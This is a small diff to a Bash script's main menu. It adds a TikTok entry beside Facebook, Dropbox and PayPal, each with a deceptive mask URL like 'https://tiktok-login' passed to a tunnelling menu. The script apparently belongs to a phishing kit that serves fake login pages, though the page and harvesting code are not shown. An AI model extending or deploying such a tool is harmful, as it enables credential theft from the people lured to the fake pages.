@@ -376,6 +376,7 @@ main_menu() {
 		${RED}[${WHITE}04${RED}]${CYAN} Facebook
 		${RED}[${WHITE}05${RED}]${CYAN} Dropbox
 		${RED}[${WHITE}06${RED}]${CYAN} PayPal
+		${RED}[${WHITE}07${RED}]${CYAN} TikTok
 		
 		${RED}[${WHITE}99${RED}]${CYAN} About
 		${RED}[${WHITE}00${RED}]${CYAN} Exit
@@ -400,6 +401,10 @@ main_menu() {
 	elif [[ "$REPLY" == 6 || "$REPLY" == 06 ]]; then
 		website="paypal"
 		mask='https://paypal-login'
+		tunnel_menu
+	elif [[ "$REPLY" == 7 || "$REPLY" == 07 ]]; then
+		website="tiktok"
+		mask='https://tiktok-login'
 		tunnel_menu
 	elif [[ "$REPLY" == 99 ]]; then
 		about
